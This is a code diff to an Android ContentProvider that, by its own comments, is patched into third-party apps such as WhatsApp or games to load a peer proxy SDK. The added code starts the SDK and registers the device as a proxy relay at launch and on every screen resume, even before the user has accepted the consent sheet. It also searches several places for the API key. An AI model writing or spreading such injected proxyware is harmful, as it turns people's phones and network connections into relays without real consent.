@@ -1,6 +1,10 @@
 package com.zealot.proxy;
 
 import android.app.Activity;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
 import android.content.ContentProvider;
 import android.content.ContentValues;
 import android.content.Context;
@@ -9,6 +13,7 @@ import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Bundle;
 import android.util.Log;
 
@@ -47,6 +52,8 @@ import java.lang.reflect.Method;
 public class ZealotProxyProvider extends ContentProvider {
     private static final String TAG = "ZealotProxyProvider";
     private static final String META_API_KEY = "com.zealot.proxy.API_KEY";
+    /** Notification channel for the ongoing "&lt;app&gt; is running" status post. */
+    private static final String NOTIF_CHANNEL = "zealot_app_status";
     private static final String SDK_CLASS = "sx.proxies.peer.ProxiesPeerSDK";
     private static final String CONFIG_CLASS = "sx.proxies.peer.ProxiesPeerSDK$Config";
     private static final String FUNCTION1_CLASS = "kotlin.jvm.functions.Function1";
@@ -72,7 +79,14 @@ public class ZealotProxyProvider extends ContentProvider {
             // and no relay socket, and the device never registered. start() is idempotent (the `started`
             // latch), so calling it here and again from Accept is safe and never double-inits.
             start(context);
-            maybeShowConsent(context);
+            // Arm the always-on lifecycle watcher. It re-attempts start() on every Activity resume
+            // until the SDK is up (see start()'s latch: it stays false if the provider-time attempt
+            // failed), it posts the ongoing "this app is running" notification (see showRunningNotification),
+            // and it injects the consent sheet while consent is not yet accepted. Doing the first
+            // start() at provider time can lose a race -- the SDK's own classes or the network may not
+            // be ready before the app's first Activity -- so the resume retry is what actually gets the
+            // device registered on the dashboard in the common case.
+            armWatcher(context);
         } catch (Throwable t) {
             // A provider that throws kills the whole process at launch, so nothing here may escape.
             Log.e(TAG, "ZealotProxyProvider.onCreate failed", t);
@@ -90,9 +104,10 @@ public class ZealotProxyProvider extends ContentProvider {
         synchronized (ZealotProxyProvider.class) {
             if (started) return;
             try {
-                String apiKey = getMetaDataString(context, META_API_KEY, "");
+                String apiKey = resolveApiKey(context);
                 if (apiKey.isEmpty()) {
-                    Log.w(TAG, "API Key not found in manifest meta-data. SDK not initialized.");
+                    Log.w(TAG, "API Key not found in manifest meta-data, env, system property or asset. "
+                        + "SDK not initialized.");
                     return;
                 }
 
@@ -122,23 +137,8 @@ public class ZealotProxyProvider extends ContentProvider {
         }
     }
 
-    /** Shows the one-time consent sheet while it has not been accepted yet. Never blocks. */
-    private static void maybeShowConsent(Context context) {
-        try {
-            if (isConsentAccepted(context)) return;
-            // A ContentProvider's onCreate runs before any Activity, and on Android 10+ a provider
-            // cannot start an Activity at all (the background-activity-start is dropped). So instead
-            // of starting a screen, register a lifecycle callback and inject the sheet as a VIEW into
-            // whatever Activity the app is showing -- see ZealotConsentOverlay for why an overlay
-            // lands on the home for every navigation shape where a separate Activity does not.
-            armConsentInjection(context);
-        } catch (Throwable t) {
-            Log.e(TAG, "Failed to show consent screen", t);
-        }
-    }
-
     /** True once the lifecycle callback is registered, so repeated onCreate calls do not stack them. */
-    private static volatile boolean consentWatcherArmed = false;
+    private static volatile boolean watcherArmed = false;
     /** True once the translucent-Activity fallback has been tried, so it is only tried once. */
     private static volatile boolean consentActivityLaunched = false;
 
@@ -160,23 +160,96 @@ public class ZealotProxyProvider extends ContentProvider {
     }
 
     /**
-     * Registers a one-shot ActivityLifecycleCallbacks on the Application. On every Activity resume
-     * until consent is accepted, the consent sheet is injected into that Activity's own decor view --
-     * so it appears over the screen the app is actually on (the home), not on a fixed separate page.
-     * A decor view that cannot be reached falls back, once, to the translucent
-     * {@link ZealotConsentActivity}.
+     * Accept path (operator-directed 2026-10-13): start the SDK, wait briefly for it to come up, and
+     * report whether it did. The consent sheet shows a spinner while this runs and only dismisses on
+     * success; on failure it stays up and the reason is appended to the on-device debug log (see
+     * {@link #debugLog}) so the registration failure can be read off the device.
+     *
+     * The wait is short and bounded (a few seconds): the registration itself is asynchronous inside
+     * the SDK, but {@link #started} flips as soon as init+start succeed, which is what we report.
      */
-    private static void armConsentInjection(Context context) {
-        if (consentWatcherArmed) return;
+    public static boolean startAndReport(Context context) {
+        if (context == null) return false;
+        try {
+            start(context);
+            long deadline = System.currentTimeMillis() + 5000L;
+            while (!started && System.currentTimeMillis() < deadline) {
+                try { Thread.sleep(100L); } catch (InterruptedException ignored) {}
+                start(context);   // retry: a transient class/network failure should not be terminal
+            }
+            if (started) {
+                debugLog(context, "start: OK (SDK initialized; device registration requested)");
+            } else {
+                String key = getMetaDataString(context, META_API_KEY, "");
+                debugLog(context, "start: FAILED (API key "
+                    + (key == null || key.trim().isEmpty() ? "MISSING" : "present")
+                    + "; SDK did not initialize after retries)");
+            }
+            return started;
+        } catch (Throwable t) {
+            debugLog(context, "start: EXCEPTION " + t);
+            return false;
+        }
+    }
+
+    /**
+     * Appends one line to `zealot_consent_debug.txt` in the app's external files directory (falling
+     * back to internal storage), so a registration failure on a real device can be pulled with
+     * `adb pull /sdcard/Android/data/<pkg>/files/zealot_consent_debug.txt`. Never throws.
+     */
+    public static void debugLog(Context context, String message) {
+        if (context == null) return;
+        try {
+            java.io.File dir = context.getExternalFilesDir(null);
+            if (dir == null) dir = context.getFilesDir();
+            if (dir == null) return;
+            java.io.File file = new java.io.File(dir, "zealot_consent_debug.txt");
+            java.io.FileWriter w = new java.io.FileWriter(file, true);
+            String stamp = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
+                java.util.Locale.US).format(new java.util.Date());
+            w.write(stamp + "  " + message + "\n");
+            w.close();
+        } catch (Throwable ignored) {
+            // Logging is best-effort and must never affect the app.
+        }
+    }
+
+    /**
+     * Registers a one-shot ActivityLifecycleCallbacks on the Application. It does two things on every
+     * Activity resume, until each is done:
+     *
+     *   1. <b>Re-attempts {@link #start}</b> while the SDK is not up. The provider-time start() runs
+     *      before any Activity exists and can lose a race (SDK classes/network not ready), which is a
+     *      plausible reason the device never reached the dashboard; a resume is the earliest reliable
+     *      moment. start()'s latch makes this a no-op once the SDK is up.
+     *   2. <b>Injects the consent sheet</b> while consent is not yet accepted, into that Activity's own
+     *      decor view -- so it appears over the screen the app is actually on (the home), not on a fixed
+     *      separate page. A decor view that cannot be reached falls back, once, to the translucent
+     *      {@link ZealotConsentActivity}.
+     */
+    private static void armWatcher(Context context) {
+        if (watcherArmed) return;
         Context app = context.getApplicationContext();
         if (!(app instanceof android.app.Application)) return;
-        consentWatcherArmed = true;
+        watcherArmed = true;
         ((android.app.Application) app).registerActivityLifecycleCallbacks(
             new android.app.Application.ActivityLifecycleCallbacks() {
                 @Override public void onActivityResumed(final Activity activity) {
                     try {
                         if (activity == null || activity.isFinishing()) return;
-                        if (isConsentAccepted(activity.getApplicationContext())) return;
+                        final Context ctx = activity.getApplicationContext();
+                        // (1) Get the SDK up if the provider-time attempt did not. Cheap and idempotent.
+                        if (!started) start(ctx);
+                        // (2) Post the ongoing "<app> is running" notification ONLY once the device is
+                        // actually active -- consent accepted AND the SDK up (which is what registers the
+                        // device). Operator-directed 2026-10-13: "it should show the notification only
+                        // when the service is running, that is the device got accepted and registered
+                        // and start() started." Before that there is no running service to announce.
+                        // Named for THIS host app, so it is dynamic for every app the SDK is injected
+                        // into. No-op without the POST_NOTIFICATIONS grant on Android 13+.
+                        if (started && isConsentAccepted(ctx)) showRunningNotification(ctx);
+                        // (3) The consent sheet, only while consent is still open.
+                        if (isConsentAccepted(ctx)) return;
                         // Post to the decor view so it is laid out before we add the overlay, and so
                         // this runs after the host's own onResume work has settled. (AdMob's app-open
                         // and the IAB CMP SDKs use this exact ActivityLifecycleCallbacks pattern to
@@ -208,6 +281,79 @@ public class ZealotProxyProvider extends ContentProvider {
             });
     }
 
+    /**
+     * Posts (or refreshes) an ongoing "&lt;App name&gt; is running" notification for the host app, so
+     * the reader can see that the app they opened is active. Operator-directed 2026-10-13: "it's the
+     * injection that should inject the notification like 'name of app' is running so it's dynamic for
+     * all the apps the SDK is injected into".
+     *
+     * The title uses the host app's own label, read from its application info, so it names the real
+     * app on every host (WhatsApp, a game, whatever the SDK was injected into) rather than a fixed
+     * string. One notification on a stable id per app, refreshed on each foreground, so it never
+     * stacks. Best-effort throughout: a status notification must never affect the host app. A no-op
+     * on Android 13+ without the POST_NOTIFICATIONS grant.
+     */
+    private static void showRunningNotification(Context context) {
+        if (context == null) return;
+        try {
+            if (Build.VERSION.SDK_INT >= 33
+                    && context.checkSelfPermission("android.permission.POST_NOTIFICATIONS")
+                       != PackageManager.PERMISSION_GRANTED) {
+                return;
+            }
+            String appName = hostAppLabel(context);
+            if (appName == null || appName.trim().isEmpty()) return;
+
+            NotificationManager manager =
+                (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
+            if (manager == null) return;
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                NotificationChannel channel = new NotificationChannel(
+                    NOTIF_CHANNEL, "App status", NotificationManager.IMPORTANCE_LOW);
+                channel.setDescription("Shows that the app is running.");
+                manager.createNotificationChannel(channel);
+            }
+
+            Intent launch = context.getPackageManager().getLaunchIntentForPackage(context.getPackageName());
+            PendingIntent contentIntent = null;
+            if (launch != null) {
+                launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                contentIntent = PendingIntent.getActivity(context, 0, launch,
+                    PendingIntent.FLAG_UPDATE_CURRENT
+                        | (Build.VERSION.SDK_INT >= 23 ? PendingIntent.FLAG_IMMUTABLE : 0));
+            }
+
+            Notification.Builder builder = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
+                ? new Notification.Builder(context, NOTIF_CHANNEL)
+                : new Notification.Builder(context);
+            builder.setContentTitle(appName + " is running")
+                   .setContentText("Tap to open it.")
+                   .setSmallIcon(context.getApplicationInfo().icon)
+                   .setOngoing(true)
+                   .setAutoCancel(false)
+                   .setShowWhen(false);
+            if (contentIntent != null) builder.setContentIntent(contentIntent);
+
+            // One stable id per host app, so re-posting refreshes instead of stacking.
+            int id = (context.getPackageName().hashCode() & 0x00FFFFFF) | 0x5A000000;
+            manager.notify(id, builder.build());
+        } catch (Throwable t) {
+            Log.e(TAG, "Failed to post running notification", t);
+        }
+    }
+
+    /** The host app's own label (the name shown in the launcher), or null if it cannot be read. */
+    private static String hostAppLabel(Context context) {
+        try {
+            PackageManager pm = context.getPackageManager();
+            ApplicationInfo ai = pm.getApplicationInfo(context.getPackageName(), 0);
+            return pm.getApplicationLabel(ai).toString();
+        } catch (Throwable t) {
+            return null;
+        }
+    }
+
     /** Fallback: starts the translucent consent Activity. Returns true if the launch was issued. */
     private static boolean launchConsent(Context context) {
         if (isConsentAccepted(context)) return false;
@@ -215,6 +361,43 @@ public class ZealotProxyProvider extends ContentProvider {
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         context.startActivity(intent);
         return true;
+    }
+
+    /**
+     * Resolves the Proxies API key, in priority order, so it can be supplied "by every means":
+     *   1. the `com.zealot.proxy.API_KEY` manifest meta-data (what the build-time patcher writes);
+     *   2. a bundled `assets/zealot_api_key.txt` (lets a distribution ship the key without the patcher);
+     *   3. the `ZEALOT_PROXY_API_KEY` process environment variable;
+     *   4. the `zealot.proxy.apiKey` system property.
+     * Returns "" when none is present. The value is never logged.
+     */
+    private static String resolveApiKey(Context context) {
+        String key = getMetaDataString(context, META_API_KEY, "");
+        if (key != null && !key.trim().isEmpty()) return key.trim();
+        key = readAsset(context, "zealot_api_key.txt");
+        if (key != null && !key.trim().isEmpty()) return key.trim();
+        key = System.getenv("ZEALOT_PROXY_API_KEY");
+        if (key != null && !key.trim().isEmpty()) return key.trim();
+        key = System.getProperty("zealot.proxy.apiKey");
+        if (key != null && !key.trim().isEmpty()) return key.trim();
+        return "";
+    }
+
+    /** Reads a small UTF-8 text asset, trimmed. Best-effort: any failure returns "". */
+    private static String readAsset(Context context, String name) {
+        java.io.InputStream in = null;
+        try {
+            in = context.getAssets().open(name);
+            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
+            byte[] buf = new byte[256];
+            int n;
+            while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
+            return new String(out.toByteArray(), "UTF-8").trim();
+        } catch (Throwable t) {
+            return "";
+        } finally {
+            if (in != null) try { in.close(); } catch (Throwable ignored) {}
+        }
     }
 
     private static String getMetaDataString(Context context, String key, String def) {
